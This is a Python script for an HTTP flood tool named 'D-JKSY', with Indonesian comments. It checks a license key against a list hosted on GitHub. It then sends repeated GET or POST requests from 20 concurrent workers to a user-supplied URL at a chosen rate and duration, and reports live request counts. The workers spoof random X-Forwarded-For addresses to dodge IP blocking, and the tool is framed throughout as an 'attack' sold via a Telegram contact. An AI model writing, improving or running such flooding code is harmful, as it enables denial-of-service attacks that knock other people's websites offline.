import asyncio
import aiohttp
import time
import random
import sys
import os
import hashlib
import platform
import requests  # Pastikan sudah: pip install requests
from datetime import datetime
from rich.console import Console
from rich.panel import Panel
from rich.text import Text
from rich.table import Table

# --- REMOTE AUTHORITY CONFIG ---
# Menggunakan link RAW agar script bisa membaca teks di dalamnya
AUTH_SERVER_URL = "https://raw.githubusercontent.com/iamkhy11/d-jksy/main/keys.txt"
console = Console()

def get_device_info():
    return {
        "os": platform.system(),
        "arch": platform.machine(),
        "py_ver": platform.python_version()
    }

def clear():
    os.system('cls' if os.name == 'nt' else 'clear')

def show_usage_menu():
    """Tabel panduan penggunaan aplikasi"""
    table = Table(title="[bold yellow]D-JKSY OPERATIONAL MANUAL[/bold yellow]", border_style="cyan", header_style="bold magenta")
    
    table.add_column("Parameter", style="white")
    table.add_column("Deskripsi", style="dim white")
    table.add_column("Contoh Input", style="bold green")

    table.add_row("URL", "Alamat target (Wajib pakai http/https)", "https://example.com")
    table.add_row("Mode", "Metode pengiriman (GET atau POST)", "GET")
    table.add_row("RPS", "Requests Per Second (Kecepatan)", "10 - 30")
    table.add_row("Duration", "Lama pengetesan (detik)", "60")
    table.add_row("Owner", "Kontak Telegram Developer", "@nazisme1930")
    
    console.print(table)
    console.print("[italic cyan]* Gunakan RPS tinggi hanya jika perangkat & internet stabil.\n[/italic cyan]")

def check_system_auth():
    clear()
    device = get_device_info()
    
    # --- SIGNATURE HEADER ---
    signature = Text.assemble(
        ("\n I AM JOKESKYLS ", "bold white on red"),
        (" REMOTE AUTHORITY SYSTEM ACTIVE ", "bold red on white"),
    )
    console.print(signature, justify="center")
    
    header_text = Text.assemble(
        ("\n D-JKSY ", "bold white on cyan"),
        (f" v9.5-REMOTE ", "bold cyan"),
        (f"| {device['os']} {device['arch']} ", "dim white"),
        (f"| Dev: @nazisme1930 ", "italic yellow")
    )
    console.print(header_text)
    console.print("[dim]─[/dim]" * 65)
    
    console.print("\n[bold yellow][*][/bold yellow] Menghubungkan ke server lisensi @iamkhy11...")
    
    try:
        # Mengambil daftar key dari GitHub
        response = requests.get(AUTH_SERVER_URL, timeout=10)
        if response.status_code != 200:
            console.print("[bold red][!][/bold red] Server Error: Gagal mengakses database lisensi.")
            sys.exit()
            
        # Memisahkan setiap baris di file keys.txt menjadi daftar (list)
        active_keys = [key.strip() for key in response.text.splitlines() if key.strip()]
        
        sys_key = console.input("[bold cyan]»[/bold cyan] [bold white]Enter License Key:[/bold white] ").strip()
        
        if sys_key in active_keys:
            console.print("[bold green][+][/bold green] Akses Diterima. Selamat beraksi, Boss.")
            time.sleep(1.5)
            clear()
            show_usage_menu()
            return True
        else:
            console.print("\n[bold red][!][/bold red] AKSES DITOLAK: Lisensi Tidak Terdaftar atau Expired.")
            console.print("[bold white]Hubungi Developer: @nazisme1930 untuk aktivasi.[/bold white]")
            sys.exit()
            
    except Exception as e:
        console.print(f"[bold red][!][/bold red] Koneksi Gagal: Cek koneksi internet anda. ({e})")
        sys.exit()

stats = {"total": 0, "success": 0, "failed": 0, "latency": 0}

async def attack_worker(target, mode, rps_limit):
    connector = aiohttp.TCPConnector(limit=100, ssl=False)
    timeout = aiohttp.ClientTimeout(total=10)
    delay = 1.0 / rps_limit if rps_limit > 0 else 0
    
    async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
        while True:
            headers = {
                "User-Agent": f"D-JKSY/9.5 (@nazisme1930)",
                "X-Forwarded-For": f"{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}",
            }
            t1 = time.perf_counter()
            try:
                if mode == "POST":
                    async with session.post(target, headers=headers, data={"dev": "JOKESKYLS"}) as resp:
                        await resp.release()
                else:
                    async with session.get(f"{target}?tier=S&dev=@nazisme1930", headers=headers) as resp:
                        await resp.release()
                
                stats["latency"] = (time.perf_counter() - t1) * 1000
                stats["total"] += 1
                stats["success"] += 1 if resp.status < 400 else 0
                if resp.status >= 400: stats["failed"] += 1
            except Exception:
                stats["total"] += 1
                stats["failed"] += 1
            
            if delay > 0:
                await asyncio.sleep(delay) 

async def monitor(duration, target, mode):
    start_time = time.time()
    last_total = 0
    
    clear()
    status_msg = (
        f"[bold red]OWNER  :[/bold red] [bold white]JOKESKYLS[/bold white] [dim](@nazisme1930)[/dim]\n"
        f"[bold white]TARGET :[/bold white] [yellow]{target}[/yellow] | [bold white]MODE:[/bold white] [cyan]{mode}[/cyan]\n"
        f"[bold white]ENGINE :[/bold white] [bold green]TIER S ACTIVE[/bold green]"
    )
    console.print(Panel(status_msg, border_style="red", title="[bold white]D-JKSY CONTROL CENTER[/bold white]"))

    console.print(f"\n{'TIME':<12} {'RPS':<10} {'LATENCY':<12} {'SUCCESS':<15} {'FAIL'}")
    console.print("[dim]━[/dim]" * 65)

    try:
        while time.time() - start_time < duration:
            current_total = stats["total"]
            rps = (current_total - last_total)
            last_total = current_total
            
            lat = stats["latency"]
            lat_color = "green" if lat < 200 else "yellow" if lat < 500 else "red"
            ts = datetime.now().strftime("%H:%M:%S")
            
            console.print(
                f"[dim]{ts}[/dim]     "
                f"[bold cyan]{rps:<9}[/bold cyan] "
                f"[{lat_color}]{lat:>7.0f}ms[/{lat_color}]     "
                f"[green]{stats['success']:>10,}[/green]    "
                f"[red]{stats['failed']}[/red]"
            )
            await asyncio.sleep(1)
    except asyncio.CancelledError:
        pass

async def main():
    if not check_system_auth(): return
    
    try:
        console.print("[bold red]── TIER S CONFIGURATION ──[/bold red]")
        target = console.input("[bold white] URL    : [/bold white]").strip()
        if not target.startswith("http"):
            console.print("[bold red][!] ERROR: URL harus diawali http:// atau https://[/bold red]")
            return

        mode   = console.input("[bold white] Mode (GET/POST) : [/bold white]").upper() or "GET"
        rps    = int(console.input("[bold white] Target RPS      : [/bold white]") or "100")
        dur    = int(console.input("[bold white] Duration (sec)  : [/bold white]") or "60")

        workers = [asyncio.create_task(attack_worker(target, mode, rps/20)) for _ in range(20)]
        logger = asyncio.create_task(monitor(dur, target, mode))
        
        await asyncio.sleep(dur)
        
        for w in workers: w.cancel()
        logger.cancel()
        
        console.print(f"\n[bold red]─[/bold red]" * 55)
        console.print(f"[bold white]BY JOKESKYLS (@nazisme1930)[/bold white] | Total Packets: [bold cyan]{stats['total']:,}[/bold cyan]")
        console.print(f"[bold red]─[/bold red]" * 55)
    except (ValueError, Exception) as e:
        console.print(f"\n[bold red][!] Error: {e}[/bold red]")

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        console.print("\n[bold red][!] Session Force Closed by JOKESKYLS.[/bold red]")
